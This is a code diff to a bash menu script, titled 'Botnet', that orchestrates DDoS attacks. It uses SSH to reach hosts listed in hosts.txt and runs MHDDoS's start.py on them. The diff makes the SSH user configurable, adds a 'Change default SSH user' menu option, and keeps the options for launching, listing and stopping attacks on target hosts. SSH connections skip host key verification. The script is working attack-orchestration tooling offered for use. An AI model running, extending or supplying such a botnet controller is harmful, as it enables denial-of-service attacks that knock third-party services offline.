@@ -19,11 +19,20 @@ git fetch
 echo "Already the latest version."
 
 
+if [ -s "$SCRIPT_DIR/username.txt" ]; then
+    USER=$(<"$SCRIPT_DIR/username.txt")
+    export USER
+else
+  export USER='root'
+fi
+
 touch -a "$SCRIPT_DIR/hosts.txt"
 export DIALOGRC="$SCRIPT_DIR/.dialogrc"
 
 while : ; do
-    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Before the start populate your hosts.txt file!" 15 55 8  1 'Botnet attack on host' 2 'Bandwidth monitoring' 3 'Show current attacks' 4 'Stop all botnet attacks' 5 'Stop certain host/ip attack in botnet' 6 'Setup SSH hosts' 7 'Cloud providers' 8 'Exit')
+    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Before the start populate your hosts.txt file!" 20 65 9  \
+    1 'Botnet attack on host' 2 'Bandwidth monitoring' 3 'Show current attacks' 4 'Stop all botnet attacks' \
+    5 'Stop certain host/ip attack in botnet' 6 'Setup SSH hosts' 7 'Change default SSH user' 8 'Cloud providers' 9 'Exit')
 
     case $MENU_OPTION in
 
@@ -42,7 +51,7 @@ while : ; do
         MENU_OPTION=$(dialog --title 'Bandwidth monitoring' --menu --stdout "Choose host to monitor:" 15 55 ${#options[@]} "${options[@]}")
         HOST=${options[$MENU_OPTION*2-1]}
 
-        (echo -e "DSTAT" && cat) | ssh -t -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "root@$HOST" 'python3 MHDDoS/start.py TOOLS'
+        (echo -e "DSTAT" && cat) | ssh -t -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$HOST" 'python3 MHDDoS/start.py TOOLS'
         break
         ;;
 
@@ -51,7 +60,7 @@ while : ; do
         printf '' > "$SCRIPT_DIR/output.txt"
         while read -r host
         do
-             printf "%s\n%s\n\n" "$host" "$(ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "root@$host" "ps -aux | grep start.py | grep -v grep | grep -vi screen" | awk '{print $13, $14}' | sed 's/^/    /')" >> "$SCRIPT_DIR/output.txt" &
+             printf "%s\n%s\n\n" "$host" "$(ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "$USER@$host" "ps -aux | grep start.py | grep -v grep | grep -vi screen" | awk '{print $13, $14}' | sed 's/^/    /')" >> "$SCRIPT_DIR/output.txt" &
         done < "$SCRIPT_DIR/hosts.txt"
         wait
         dialog --title 'Hosts and their active attacks' --editbox "$SCRIPT_DIR/output.txt" --stdout 35 70
@@ -82,7 +91,15 @@ while : ; do
         continue
         ;;
 
-    7)
+    7) #Change default username
+        USER=$(bash "$SCRIPT_DIR/menus/username.sh")
+        echo "$USER" > "$SCRIPT_DIR/username.txt"
+        export USER
+
+        continue
+        ;;
+
+    8)
         MENU_OPTION=$(dialog --title 'Cloud providers' --menu --stdout "Choose option:" 15 55 2 1 'Digital Ocean' 2 'Back')
         case $MENU_OPTION in
 
@@ -99,9 +116,6 @@ while : ; do
         break
         ;;
 
-    8)
-        break
-        ;;
     *)
         break
         ;;
